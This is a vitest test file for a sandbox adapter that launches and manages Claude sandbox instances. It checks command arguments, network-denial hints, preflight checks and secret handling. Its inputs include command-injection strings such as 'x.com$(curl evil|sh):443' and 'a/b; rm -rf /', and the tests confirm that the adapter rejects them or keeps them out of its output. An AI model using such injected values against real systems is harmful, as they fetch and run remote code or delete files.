import { describe, expect, it } from "vitest";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll } from "vitest";
import { CREATE_TIMEOUT_MS, coverMounts, createArgs, makeSbxAdapter } from "../../../src/sandbox/sbx/adapter.ts";
import { FAKE_ENV_MARKER, fakeEnvPaths } from "../../../src/core/fake-env.ts";
import type { SbxResult, SbxRunner } from "../../../src/sandbox/sbx/run.ts";
import type { SandboxHandle } from "../../../src/sandbox/types.ts";

type Call = { args: string[]; opts?: { timeoutMs?: number; env?: NodeJS.ProcessEnv } };
const ok = (stdout = "", stderr = ""): SbxResult => ({ code: 0, stdout, stderr, timedOut: false });
const fail = (code: number | null, stderr: string, stdout = "", timedOut = false): SbxResult => ({ code, stdout, stderr, timedOut });

/** A recording fake runner; `respond` picks the answer per call (default: exit 0). */
function fakeRunner(respond: (args: string[]) => SbxResult = () => ok()): { run: SbxRunner; calls: Call[] } {
  const calls: Call[] = [];
  const run: SbxRunner = async (args, opts) => {
    calls.push({ args, opts });
    return respond(args);
  };
  return { run, calls };
}

const CFG = { kitDir: "/kit", envAllow: ["ANTHROPIC_DEFAULT_SONNET_MODEL", "EXTRA_NAME"] };
const N = "dl-12-webtarsthree-tars-1-dev-a1b2c3";
const H: SandboxHandle = { adapter: "sbx", instanceName: N };
/** Every *_MODEL default allowlist name set, so preflight tests don't warn. */
const FULL_ENV = { ANTHROPIC_DEFAULT_HAIKU_MODEL: "h", ANTHROPIC_DEFAULT_SONNET_MODEL: "s", ANTHROPIC_DEFAULT_OPUS_MODEL: "o" };
const FIXTURE = readFileSync(join(import.meta.dirname, "../../fixtures/sbx/policy-log-blocked.json"), "utf8");

describe("sbx adapter: name and validateConfig", () => {
  it("is named sbx and validates with validateSbxConfig", () => {
    const a = makeSbxAdapter({ run: fakeRunner().run });
    expect(a.name).toBe("sbx");
    expect(() => a.validateConfig(undefined)).toThrow("sandbox.sbx: kitDir is required");
    expect(a.validateConfig({ kitDir: "/kit" })).toMatchObject({ kitDir: "/kit" });
  });
});

describe("sbx adapter: prepare", () => {
  it("creates with the exact argv and CREATE_TIMEOUT_MS", async () => {
    const f = fakeRunner();
    const h = await makeSbxAdapter({ run: f.run }).prepare({ instanceName: N, mounts: ["/abs/root", "/abs/repo"], config: CFG });
    expect(h).toEqual({ adapter: "sbx", instanceName: N });
    expect(CREATE_TIMEOUT_MS).toBe(180_000);
    expect(f.calls).toHaveLength(1);
    expect(f.calls[0].args).toEqual(["create", "--name", N, "--no-progress", "--no-input", "claude", "--kit", "/kit", "/abs/root", "/abs/repo"]);
    expect(f.calls[0].opts?.timeoutMs).toBe(CREATE_TIMEOUT_MS);
  });

  it("passes --memory when configured", async () => {
    const f = fakeRunner();
    await makeSbxAdapter({ run: f.run }).prepare({ instanceName: N, mounts: ["/abs/root"], config: { ...CFG, memory: "4g" } });
    expect(f.calls[0].args).toEqual(["create", "--name", N, "--no-progress", "--no-input", "--memory", "4g", "claude", "--kit", "/kit", "/abs/root"]);
  });

  it("with a template, creates from it with --pull never, keeping the kit", async () => {
    const f = fakeRunner();
    await makeSbxAdapter({ run: f.run }).prepare({ instanceName: N, mounts: ["/abs/root"], config: { ...CFG, template: "docker.io/library/dev-loop-sbx:v1" } });
    expect(f.calls[0].args).toEqual([
      "create", "--name", N, "--no-progress", "--no-input", "-t", "docker.io/library/dev-loop-sbx:v1", "--pull", "never", "claude", "--kit", "/kit", "/abs/root",
    ]);
  });

  it("a non-zero exit throws with the code and the first stderr line", async () => {
    const f = fakeRunner(() => fail(2, "boom: no daemon\nsecond line"));
    await expect(makeSbxAdapter({ run: f.run }).prepare({ instanceName: N, mounts: [], config: CFG })).rejects.toThrow(
      "sbx create failed (2): boom: no daemon",
    );
  });

  it("a timeout throws naming the timeout", async () => {
    const f = fakeRunner(() => fail(null, "slow", "", true));
    await expect(makeSbxAdapter({ run: f.run }).prepare({ instanceName: N, mounts: [], config: CFG })).rejects.toThrow(
      "sbx create failed (timeout): slow",
    );
  });

  it("a config without kitDir throws a clear error", async () => {
    const a = makeSbxAdapter({ run: fakeRunner().run });
    await expect(a.prepare({ instanceName: N, mounts: [], config: undefined })).rejects.toThrow(/kitDir/);
  });
});

describe("sbx adapter: wrap", () => {
  const adapter = makeSbxAdapter({ run: fakeRunner().run });

  async function handle(): Promise<SandboxHandle> {
    return adapter.prepare({ instanceName: N, mounts: [], config: CFG });
  }

  it("execs claude in the instance with -w and -e for allowlisted names present in env", async () => {
    const env = { ANTHROPIC_DEFAULT_SONNET_MODEL: "model-x", OTHER: "o", PATH: "/usr/bin" };
    const opts = { cwd: "/abs/root", env };
    const w = adapter.wrap(await handle(), "claude", ["-p", "hi"], opts);
    expect(w.cmd).toBe("sbx");
    expect(w.args).toEqual(["exec", "-w", "/abs/root", "-e", "ANTHROPIC_DEFAULT_SONNET_MODEL", N, "claude", "-p", "hi"]);
    expect(w.opts).toBe(opts);
  });

  it("omits -w when cwd is absent", async () => {
    const w = adapter.wrap(await handle(), "claude", ["-p"], { env: {} });
    expect(w.args).toEqual(["exec", N, "claude", "-p"]);
  });

  it("never puts an env value into args", async () => {
    const env = { ANTHROPIC_DEFAULT_SONNET_MODEL: "value-sonnet-1", EXTRA_NAME: "value-extra-2", SECRETISH: "value-secret-3" };
    const w = adapter.wrap(await handle(), "claude", ["-p"], { cwd: "/abs/root", env });
    expect(w.args).toContain("EXTRA_NAME");
    for (const v of Object.values(env)) for (const a of w.args) expect(a.includes(v), `${v} in ${a}`).toBe(false);
  });
});

describe("sbx adapter: inspect", () => {
  it("maps the captured policy log's blocked hosts to network denials with an approve hint", async () => {
    const f = fakeRunner(() => ok(FIXTURE));
    const r = await makeSbxAdapter({ run: f.run }).inspect(H, 0);
    expect(f.calls.map((c) => c.args)).toEqual([["policy", "log", N, "--json"]]);
    expect(f.calls[0].opts?.timeoutMs).toBeUndefined();
    expect(r.denied).toEqual([{ kind: "network", target: "example.org:443" }]);
    expect(r.approveHint).toBe("Review, then run yourself if you approve:\nsbx policy allow network example.org");
  });

  it("exit 125 is an sbx exec infra denial", async () => {
    const f = fakeRunner(() => ok('{"allowed":[],"blocked":[]}'));
    const r = await makeSbxAdapter({ run: f.run }).inspect(H, 125);
    expect(r.denied).toEqual([{ kind: "infra", target: "sbx exec" }]);
    expect(r.approveHint).toBeUndefined();
  });

  it("nothing blocked: no denials, no hint", async () => {
    const f = fakeRunner(() => ok('{"allowed":[],"blocked":[]}'));
    expect(await makeSbxAdapter({ run: f.run }).inspect(H, 0)).toEqual({ denied: [] });
  });

  it("de-duplicates hosts in the hint, one line per host without the port", async () => {
    const log = { allowed: [], blocked: [{ host: "a.example:443" }, { host: "a.example:80" }, { host: "b.example:443" }, { host: "a.example:443" }] };
    const f = fakeRunner(() => ok(JSON.stringify(log)));
    const r = await makeSbxAdapter({ run: f.run }).inspect(H, 1);
    expect(r.denied).toEqual([
      { kind: "network", target: "a.example:443" },
      { kind: "network", target: "a.example:80" },
      { kind: "network", target: "b.example:443" },
    ]);
    expect(r.approveHint).toBe("Review, then run yourself if you approve:\nsbx policy allow network a.example\nsbx policy allow network b.example");
  });

  it("never puts a host with unexpected characters into a hint command, but keeps its denial", async () => {
    const bad = "x.com$(curl evil|sh):443";
    const log = { allowed: [], blocked: [{ host: bad }, { host: "y.com;rm:80" }, { host: "ok.example:443" }, { host: "[::1]:443" }] };
    const f = fakeRunner(() => ok(JSON.stringify(log)));
    const r = await makeSbxAdapter({ run: f.run }).inspect(H, 0);
    expect(r.denied).toEqual([
      { kind: "network", target: bad },
      { kind: "network", target: "y.com;rm:80" },
      { kind: "network", target: "ok.example:443" },
      { kind: "network", target: "[::1]:443" },
    ]);
    expect(r.approveHint).toBe(
      [
        "Review, then run yourself if you approve:",
        "sbx policy allow network ok.example",
        "sbx policy allow network [::1]",
        `(not shown: a blocked host with unexpected characters; see sbx policy log ${N})`,
      ].join("\n"),
    );
    expect(r.approveHint).not.toContain("curl");
  });

  it("only unexpected hosts: the hint is the heading plus the not-shown line", async () => {
    const f = fakeRunner(() => ok(JSON.stringify({ allowed: [], blocked: [{ host: "a b:443" }] })));
    const r = await makeSbxAdapter({ run: f.run }).inspect(H, 0);
    expect(r.approveHint).toBe(`Review, then run yourself if you approve:\n(not shown: a blocked host with unexpected characters; see sbx policy log ${N})`);
  });

  it("a failed policy log call is an infra denial, never a throw", async () => {
    const f = fakeRunner(() => fail(1, "error: daemon down"));
    const r = await makeSbxAdapter({ run: f.run }).inspect(H, 125);
    expect(r.denied).toEqual([
      { kind: "infra", target: "sbx exec" },
      { kind: "infra", target: "policy log" },
    ]);
  });

  it("unparseable policy log JSON is an infra denial, never a throw", async () => {
    for (const out of ["not json", "null", '{"blocked":"x"}']) {
      const f = fakeRunner(() => ok(out));
      expect((await makeSbxAdapter({ run: f.run }).inspect(H, 0)).denied).toEqual([{ kind: "infra", target: "policy log" }]);
    }
  });
});

describe("sbx adapter: teardown", () => {
  it("runs rm -f on the instance", async () => {
    const f = fakeRunner();
    await expect(makeSbxAdapter({ run: f.run }).teardown(H)).resolves.toBeUndefined();
    expect(f.calls.map((c) => c.args)).toEqual([["rm", "-f", N]]);
  });

  it("a not-found stderr is done", async () => {
    const f = fakeRunner(() => fail(1, `error: sandbox '${N}' not found`));
    await expect(makeSbxAdapter({ run: f.run }).teardown(H)).resolves.toBeUndefined();
  });

  it("twice runs rm twice and both resolve", async () => {
    let n = 0;
    const f = fakeRunner(() => (n++ === 0 ? ok() : fail(1, `error: sandbox '${N}' not found`)));
    const a = makeSbxAdapter({ run: f.run });
    await expect(a.teardown(H)).resolves.toBeUndefined();
    await expect(a.teardown(H)).resolves.toBeUndefined();
    expect(f.calls.map((c) => c.args)).toEqual([["rm", "-f", N], ["rm", "-f", N]]);
  });

  it("any other failure throws (spawn-claude logs it)", async () => {
    const f = fakeRunner(() => fail(1, "error: daemon down"));
    await expect(makeSbxAdapter({ run: f.run }).teardown(H)).rejects.toThrow("sbx rm failed (1): error: daemon down");
  });
});

describe("sbx adapter: cleanupOrphans", () => {
  it("removes only names that start with the prefix, one rm per name", async () => {
    const list = [{ name: "dl-1-a-x-1-dev-aaaaaa" }, { name: "dl-3-a-b-x-1-dev-bbbbbb" }, { name: "dl-1-a-y-2-research-cccccc" }, { name: "other" }];
    const f = fakeRunner((args) => (args[0] === "ls" ? ok(JSON.stringify(list)) : ok()));
    await expect(makeSbxAdapter({ run: f.run }).cleanupOrphans({ prefix: "dl-1-a-" })).resolves.toBeUndefined();
    expect(f.calls.map((c) => c.args)).toEqual([
      ["ls", "--json"],
      ["rm", "-f", "dl-1-a-x-1-dev-aaaaaa"],
      ["rm", "-f", "dl-1-a-y-2-research-cccccc"],
    ]);
  });

  it("the other project's prefix removes only its own", async () => {
    const list = [{ name: "dl-1-a-x-1-dev-aaaaaa" }, { name: "dl-3-a-b-x-1-dev-bbbbbb" }];
    const f = fakeRunner((args) => (args[0] === "ls" ? ok(JSON.stringify(list)) : ok()));
    await makeSbxAdapter({ run: f.run }).cleanupOrphans({ prefix: "dl-3-a-b-" });
    expect(f.calls.map((c) => c.args)).toEqual([["ls", "--json"], ["rm", "-f", "dl-3-a-b-x-1-dev-bbbbbb"]]);
  });

  it("a failed ls throws sbx ls failed", async () => {
    const f = fakeRunner(() => fail(1, "error: daemon down"));
    await expect(makeSbxAdapter({ run: f.run }).cleanupOrphans({ prefix: "dl-1-a-" })).rejects.toThrow(/^sbx ls failed: /);
  });

  it("unparseable ls output throws sbx ls failed", async () => {
    const f = fakeRunner(() => ok("nope"));
    await expect(makeSbxAdapter({ run: f.run }).cleanupOrphans({ prefix: "dl-1-a-" })).rejects.toThrow(/^sbx ls failed: /);
  });

  it("an empty list removes nothing", async () => {
    const f = fakeRunner(() => ok("[]"));
    await makeSbxAdapter({ run: f.run }).cleanupOrphans({ prefix: "dl-1-a-" });
    expect(f.calls.map((c) => c.args)).toEqual([["ls", "--json"]]);
  });
});

describe("sbx adapter: preflight", () => {
  const tmp = mkdtempSync(join(tmpdir(), "sbx-preflight-"));
  const kit = join(tmp, "kit");
  mkdirSync(kit);
  writeFileSync(join(kit, "spec.yaml"), "name: kit\n");
  const emptyKit = join(tmp, "empty-kit");
  mkdirSync(emptyKit);
  writeFileSync(join(emptyKit, "README"), "x");
  afterAll(() => rmSync(tmp, { recursive: true, force: true }));

  const P = "dl-12-webtarsthree-preflight-abc123";
  const R = "fandango/webtarsthree";
  const CHECK = [
    "exec", P, "sh", "-c",
    `node --version && git --version && jq --version && echo dl-step:direnv && direnv version && echo dl-step:git && git ls-remote git@github.com:${R}.git HEAD >/dev/null && echo dl-step:gh && gh api repos/${R} --jq .full_name`,
  ];
  const NO_REPO_CHECK = ["exec", P, "sh", "-c", "node --version && git --version && jq --version && echo dl-step:direnv && direnv version"];
  const identity = (p: string) => p;
  const ctx = (over: Partial<{ kitDir: string; mounts: string[]; cwd: string; repoRoot: string; githubRepo: string | undefined }> = {}) => ({
    repoRoot: over.repoRoot ?? "/abs/root",
    mounts: over.mounts ?? ["/abs/root", "/abs/repo"],
    cwd: over.cwd ?? "/abs/root",
    instanceName: P,
    githubRepo: "githubRepo" in over ? over.githubRepo : R,
    config: { kitDir: over.kitDir ?? kit, envAllow: [] },
  });
  const BASE = "v24.3.0\ngit version 2.47.0\njq-1.7.1\n";
  const DIRENV = `${BASE}dl-step:direnv\n2.32.1\n`;
  const GOOD = ok(`${DIRENV}dl-step:git\ndl-step:gh\n${R}\n`);
  const answer = (exec: SbxResult) => (args: string[]) => (args[0] === "exec" ? exec : ok());

  it("creates, runs the check, and removes the instance", async () => {
    const f = fakeRunner(answer(GOOD));
    await expect(makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV }).preflight(ctx())).resolves.toBeUndefined();
    expect(f.calls.map((c) => c.args)).toEqual([
      ["create", "--name", P, "--no-progress", "--no-input", "claude", "--kit", kit, "/abs/root", "/abs/repo"],
      CHECK,
      ["rm", "-f", P],
    ]);
    expect(f.calls[0].opts?.timeoutMs).toBe(CREATE_TIMEOUT_MS);
  });

  it("refuses a mount whose case differs from the disk's", async () => {
    const f = fakeRunner();
    const realpath = (p: string) => p.replace("/abs/repos/", "/abs/Repos/");
    await expect(
      makeSbxAdapter({ run: f.run, realpath, hostNodeMajor: 24, env: FULL_ENV }).preflight(ctx({ mounts: ["/abs/repos/x"], cwd: "/abs/Repos/x" })),
    ).rejects.toThrow('sandbox paths must match the disk\'s real case: "/abs/repos/x" is "/abs/Repos/x" on disk; cd into the real path and restart');
    expect(f.calls).toEqual([]);
  });

  it("a wrong-case mount that is not the cwd names targetRepo.path as the likely source", async () => {
    const realpath = (p: string) => p.replace("/abs/repos/", "/abs/Repos/");
    await expect(
      makeSbxAdapter({ run: fakeRunner().run, realpath, hostNodeMajor: 24, env: FULL_ENV }).preflight(ctx({ mounts: ["/abs/repos/x"], cwd: "/abs/Repos/y" })),
    ).rejects.toThrow(
      'sandbox paths must match the disk\'s real case: "/abs/repos/x" is "/abs/Repos/x" on disk; cd into the real path and restart; if it comes from targetRepo.path, fix the case in the config',
    );
  });

  it("refuses a cwd whose case differs from the disk's", async () => {
    const realpath = (p: string) => p.replace("/abs/root", "/abs/Root");
    await expect(
      makeSbxAdapter({ run: fakeRunner().run, realpath, hostNodeMajor: 24, env: FULL_ENV }).preflight(ctx({ mounts: [], cwd: "/abs/root" })),
    ).rejects.toThrow('"/abs/root" is "/abs/Root" on disk');
  });

  it("refuses a kitDir with no yaml, or one that does not exist", async () => {
    for (const dir of [emptyKit, join(tmp, "missing")]) {
      const f = fakeRunner();
      await expect(makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV }).preflight(ctx({ kitDir: dir }))).rejects.toThrow(
        `sandbox.sbx.kitDir "${dir}" has no kit yaml`,
      );
      expect(f.calls).toEqual([]);
    }
  });

  it("refuses a node major different from the host's, and still removes the instance", async () => {
    const f = fakeRunner(answer(ok("v22.1.0\ngit version 2.47.0\n")));
    await expect(makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV }).preflight(ctx())).rejects.toThrow(
      "sandbox image has no node 24: build one with npm run sbx:template:build -- --tag=v2-node24 --node=24 and set sandbox.sbx.template (see docs/adapters/sbx/templates.md)",
    );
    expect(f.calls.at(-1)?.args).toEqual(["rm", "-f", P]);
  });

  it("preflight wants the project's node major, not the host's", async () => {
    const good = fakeRunner(answer(ok(`v26.7.0\ngit version 2.47.0\njq-1.7.1\ndl-step:direnv\n2.32.1\ndl-step:git\ndl-step:gh\n${R}\n`)));
    await expect(makeSbxAdapter({ run: good.run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV }).preflight({ ...ctx(), nodeMajor: 26 })).resolves.toBeUndefined();
    const host = fakeRunner(answer(GOOD));
    await expect(makeSbxAdapter({ run: host.run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV }).preflight({ ...ctx(), nodeMajor: 26 })).rejects.toThrow(
      /sandbox image has no node 26: build one with npm run sbx:template:build -- --tag=v2-node26 --node=26/,
    );
  });

  it("refuses a missing node", async () => {
    const f = fakeRunner(answer(fail(127, "sh: 1: node: not found")));
    await expect(makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV }).preflight(ctx())).rejects.toThrow(
      "sandbox image has no node 24: build one with npm run sbx:template:build -- --tag=v2-node24 --node=24 and set sandbox.sbx.template (see docs/adapters/sbx/templates.md)",
    );
    expect(f.calls.at(-1)?.args).toEqual(["rm", "-f", P]);
  });

  const pf = (exec: SbxResult, over = {}) =>
    makeSbxAdapter({ run: fakeRunner(answer(exec)).run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV, warn: () => {}, sleep: async () => {} }).preflight(ctx(over));

  it("a missing direnv names the template fix", async () => {
    await expect(pf(fail(127, "sh: 1: direnv: not found", `${BASE}dl-step:direnv\n`))).rejects.toThrow(
      "sandbox image has no direnv: add it to the template (npm run sbx:template:build; see docs/sandbox-sbx.md)",
    );
  });

  it("checks the target repo's .envrc is allowed when the mounts include one", async () => {
    const root = join(tmp, "dr-root");
    const repo = join(tmp, "dr-repo");
    mkdirSync(root, { recursive: true });
    mkdirSync(repo, { recursive: true });
    writeFileSync(join(repo, ".envrc"), "export X=1\n");
    const f = fakeRunner(answer(ok(`${DIRENV}dl-step:envrc\ndl-step:git\ndl-step:gh\n${R}\n`)));
    await makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV, warn: () => {} }).preflight(
      ctx({ repoRoot: root, mounts: [root, repo], cwd: root }),
    );
    expect(f.calls[1].args[4]).toContain(`echo dl-step:envrc && direnv exec '${repo}' true && echo dl-step:git`);
  });

  it("a blocked .envrc names the template rebuild, never direnv allow by the loop", async () => {
    const r = fail(1, "direnv: error /x/.envrc is blocked. Run `direnv allow` to approve its content", `${DIRENV}dl-step:envrc\n`);
    await expect(pf(r)).rejects.toThrow(
      "the target repo's .envrc is not allowed inside the sandbox (it changed, or the template predates it): rebuild the template with npm run sbx:template:build (see docs/sandbox-sbx.md)",
    );
  });

  it("git blocked by the sandbox firewall names the host and the approval command", async () => {
    const r = fail(128, "remote: Approval required for github.com:443.\nremote:\nfatal: unable to access", `${DIRENV}dl-step:git\n`);
    await expect(pf(r)).rejects.toThrow(
      "sandbox network blocked github.com (git): approve it yourself with sbx policy approval ls, or sbx policy allow network github.com (see docs/sandbox-sbx.md)",
    );
  });

  it("gh api blocked by the sandbox firewall names api.github.com", async () => {
    const r = fail(1, 'non-200 OK status code: 403 Forbidden body: "Approval required for api.github.com:443.', `${DIRENV}dl-step:git\ndl-step:gh\n`);
    await expect(pf(r)).rejects.toThrow("sandbox network blocked api.github.com (gh api)");
  });

  it("a 404 from gh api means the sandbox's GitHub token cannot see the repo", async () => {
    const r = fail(1, '{"message":"Not Found","status":"404"}gh: Not Found (HTTP 404)', `${DIRENV}dl-step:git\ndl-step:gh\n`);
    await expect(pf(r)).rejects.toThrow(
      `the sandbox's GitHub token cannot see ${R} (gh api): check its repo access and any pending org approval, then sbx secret set github (see docs/sandbox-sbx.md)`,
    );
  });

  it("repository not found from git is the same token message", async () => {
    const r = fail(128, "remote: Repository not found.\nfatal: repository not found", `${DIRENV}dl-step:git\n`);
    await expect(pf(r)).rejects.toThrow(`the sandbox's GitHub token cannot see ${R} (git)`);
  });

  it("an SSH failure from git means the template lacks the HTTPS rewrite", async () => {
    const r = fail(128, "git@github.com: Permission denied (publickey).", `${DIRENV}dl-step:git\n`);
    await expect(pf(r)).rejects.toThrow(
      'git uses SSH inside the sandbox: add git config --global url."https://github.com/".insteadOf git@github.com: to the template (see docs/sandbox-sbx.md)',
    );
  });

  it("any other GitHub failure names the step and the first stderr line", async () => {
    const r = fail(1, "boom\nmore", `${DIRENV}dl-step:git\ndl-step:gh\n`);
    await expect(pf(r)).rejects.toThrow("sbx preflight failed (gh api) after 3 tries: boom");
  });

  it("direnv's own stderr lines (from the .envrc step) never stand in for the real error", async () => {
    const noise = "direnv: loading /r/.envrc\ndirenv: export +FOO +BAR\n";
    const r = fail(1, `${noise}gh: Bad credentials (HTTP 401)\nmore`, `${DIRENV}dl-step:envrc\ndl-step:git\ndl-step:gh\n`);
    await expect(pf(r)).rejects.toThrow("sbx preflight failed (gh api) after 3 tries: gh: Bad credentials (HTTP 401)");
    const shaded = fail(1, `\u001b[mdirenv: loading /r/.envrc\u001b[0m\nboom`, `${DIRENV}dl-step:git\ndl-step:gh\n`);
    await expect(pf(shaded)).rejects.toThrow("sbx preflight failed (gh api) after 3 tries: boom");
  });

  it("with only direnv noise on stderr, says so and names the exit code", async () => {
    const r = fail(4, "direnv: loading /r/.envrc\n", `${DIRENV}dl-step:git\ndl-step:gh\n`);
    await expect(pf(r)).rejects.toThrow("sbx preflight failed (gh api) after 3 tries: exit 4, no error output");
  });

  describe("retrying a flaky GitHub step", () => {
    const seq = (results: SbxResult[]) => {
      let i = 0;
      const f = fakeRunner((args) => (args[0] === "exec" ? results[Math.min(i++, results.length - 1)] : ok()));
      const sleeps: number[] = [];
      const a = makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV, warn: () => {}, sleep: async (ms) => void sleeps.push(ms) });
      return { a, f, sleeps, execs: () => f.calls.filter((c) => c.args[0] === "exec").length };
    };
    const flaky = fail(1, "invalid character 's' looking for beginning of value", `${DIRENV}dl-step:git\ndl-step:gh\n`);
    const gitFlaky = fail(128, "fatal: unable to access", `${DIRENV}dl-step:git\n`);
    const cutOff = fail(null, "", `${DIRENV}dl-step:git\ndl-step:gh\n`);

    it("passes when a later try succeeds, waiting between tries", async () => {
      const { a, execs, sleeps } = seq([flaky, gitFlaky, GOOD]);
      await expect(a.preflight(ctx())).resolves.toBeUndefined();
      expect(execs()).toBe(3);
      expect(sleeps).toEqual([2000, 2000]);
    });

    it("a process cut off with no exit code is retried too", async () => {
      const { a, execs } = seq([cutOff, GOOD]);
      await expect(a.preflight(ctx())).resolves.toBeUndefined();
      expect(execs()).toBe(2);
    });

    it("fails after 3 tries with the last try's error, and still removes the instance once", async () => {
      const { a, f, execs } = seq([flaky, flaky, flaky, GOOD]);
      await expect(a.preflight(ctx())).rejects.toThrow("sbx preflight failed (gh api) after 3 tries: invalid character 's' looking for beginning of value");
      expect(execs()).toBe(3);
      expect(f.calls.filter((c) => c.args[0] === "rm")).toHaveLength(1);
    });

    it("never retries a diagnosed failure: blocked host, missing repo, SSH, non-GitHub steps", async () => {
      for (const r of [
        fail(1, 'non-200 OK status code: 403 Forbidden body: "Approval required for api.github.com:443.', `${DIRENV}dl-step:git\ndl-step:gh\n`),
        fail(1, "gh: Not Found (HTTP 404)", `${DIRENV}dl-step:git\ndl-step:gh\n`),
        fail(128, "git@github.com: Permission denied (publickey).", `${DIRENV}dl-step:git\n`),
        fail(127, "sh: 1: direnv: not found", `${BASE}dl-step:direnv\n`),
        ok("v22.1.0\n"),
      ]) {
        const { a, execs } = seq([r, GOOD]);
        await expect(a.preflight(ctx())).rejects.toThrow();
        expect(execs()).toBe(1);
      }
    });
  });

  it("without a githubRepo, skips the GitHub checks", async () => {
    const f = fakeRunner(answer(ok(DIRENV)));
    await makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV }).preflight(ctx({ githubRepo: undefined }));
    expect(f.calls[1].args).toEqual(NO_REPO_CHECK);
  });

  it("refuses a githubRepo that is not a plain owner/repo before any sbx call", async () => {
    const f = fakeRunner();
    await expect(
      makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV }).preflight(ctx({ githubRepo: "a/b; rm -rf /" })),
    ).rejects.toThrow('github.repo "a/b; rm -rf /" is not a plain owner/repo');
    expect(f.calls).toEqual([]);
  });

  describe("env files in shared folders", () => {
    const root = join(tmp, "root");
    const repo = join(tmp, "repo");
    mkdirSync(root);
    mkdirSync(repo);
    writeFileSync(join(root, ".env.example"), "X=\n");
    writeFileSync(join(repo, ".envrc.example"), "X=\n");

    it("ignores .example files", async () => {
      await expect(pf(GOOD, { repoRoot: root, mounts: [root, repo], cwd: root })).resolves.toBeUndefined();
    });

    for (const name of [".env", ".envrc", ".env.local"]) {
      it(`refuses a ${name} in the dev-loop folder before any sbx call`, async () => {
        writeFileSync(join(root, name), "SECRET=x\n");
        try {
          const f = fakeRunner();
          await expect(
            makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV }).preflight(ctx({ repoRoot: root, mounts: [root, repo], cwd: root })),
          ).rejects.toThrow(`${name} is in ${root}, which the sandbox can read: move it out of the repo and point DEVLOOP_ENV_FILE at it (see docs/sandbox-sbx.md)`);
          expect(f.calls).toEqual([]);
        } finally {
          rmSync(join(root, name));
        }
      });
    }

    it("only warns, naming the files, for env files in a mounted folder that is not the target repo", async () => {
      writeFileSync(join(repo, ".envrc"), "SECRET=x\n");
      try {
        const warnings: string[] = [];
        const f = fakeRunner(answer(GOOD));
        await makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV, warn: (m) => void warnings.push(m) }).preflight(
          ctx({ repoRoot: root, mounts: [root, repo], cwd: root }),
        );
        expect(warnings).toEqual([`note: the sandbox agent can read .envrc in ${repo} (expected for local dev/INT settings; keep real secrets out of it).`]);
      } finally {
        rmSync(join(repo, ".envrc"));
      }
    });
  });

  it("refuses a missing jq (git ran, jq did not), and still removes the instance", async () => {
    const f = fakeRunner(answer(fail(127, "sh: 1: jq: not found", "v24.3.0\ngit version 2.47.0\n")));
    await expect(makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV }).preflight(ctx())).rejects.toThrow(
      "sandbox image has no jq: add jq to the template (see docs/sandbox-sbx.md)",
    );
    expect(f.calls.at(-1)?.args).toEqual(["rm", "-f", P]);
  });

  it("a missing git (node ran, git did not) is sbx preflight failed, not a jq or gh message", async () => {
    const f = fakeRunner(answer(fail(127, "sh: 1: git: not found", "v24.3.0\n")));
    await expect(makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV }).preflight(ctx())).rejects.toThrow(
      "sbx preflight failed: sh: 1: git: not found",
    );
  });

  it("warns once, names only, when *_MODEL allowlist names are unset, and does not throw", async () => {
    const warnings: string[] = [];
    const env = { ANTHROPIC_DEFAULT_SONNET_MODEL: "secret-sonnet-value" };
    const f = fakeRunner(answer(GOOD));
    await expect(
      makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24, env, warn: (m) => void warnings.push(m) }).preflight(ctx()),
    ).resolves.toBeUndefined();
    expect(warnings).toEqual([
      "WARNING: ANTHROPIC_DEFAULT_HAIKU_MODEL, ANTHROPIC_DEFAULT_OPUS_MODEL not set; inside the sandbox the sonnet/opus/haiku aliases fall back to stock model ids. Set them in your DEVLOOP_ENV_FILE.",
    ]);
    expect(warnings.join("")).not.toContain("secret-sonnet-value");
  });

  it("no warning when every *_MODEL allowlist name is set", async () => {
    const warnings: string[] = [];
    const f = fakeRunner(answer(GOOD));
    await makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV, warn: (m) => void warnings.push(m) }).preflight(ctx());
    expect(warnings).toEqual([]);
  });

  it("any other exec failure is sbx preflight failed with the first stderr line", async () => {
    const f = fakeRunner(answer(fail(125, `error: sandbox '${P}' not found\nmore`)));
    await expect(makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV }).preflight(ctx())).rejects.toThrow(
      `sbx preflight failed: error: sandbox '${P}' not found`,
    );
    expect(f.calls.at(-1)?.args).toEqual(["rm", "-f", P]);
  });

  it("a failed create is sbx preflight failed, and still removes the instance", async () => {
    const f = fakeRunner((args) => (args[0] === "create" ? fail(1, "error: no daemon") : ok()));
    await expect(makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV }).preflight(ctx())).rejects.toThrow(
      /^sbx preflight failed: .*error: no daemon/,
    );
    expect(f.calls.map((c) => c.args[0])).toEqual(["create", "rm"]);
  });

  it("defaults hostNodeMajor to the running node's major", async () => {
    const major = process.versions.node.split(".")[0];
    const f = fakeRunner(answer(ok(`v${major}.0.0\ngit version 2.47.0\njq-1.7.1\ndl-step:direnv\n2.32.1\ndl-step:git\ndl-step:gh\n`)));
    await expect(makeSbxAdapter({ run: f.run, realpath: identity, env: FULL_ENV }).preflight(ctx())).resolves.toBeUndefined();
  });
});

describe("helpers shared with scripts/sbx.mjs", () => {
